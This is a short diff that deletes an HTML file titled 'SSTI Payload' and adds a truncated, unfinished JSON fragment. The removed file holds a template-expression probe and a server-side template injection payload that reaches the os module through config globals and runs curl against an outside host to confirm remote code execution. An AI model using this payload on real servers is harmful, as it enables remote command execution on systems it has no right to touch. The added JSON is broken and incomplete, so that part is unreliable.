@@ -1,12 +1,2 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>SSTI Payload</title>
-</head>
-<body>
-  <h1>Test</h1>
-  <p>Eval check: {{7*7}}</p>
-  <p>RCE: {{ config.__class__.__init__.__globals__['os'].popen('curl https://log.mzero.cloud/rce-check').read() }}</p>
-</body>
-</html>
-
+```json
+{"a":1
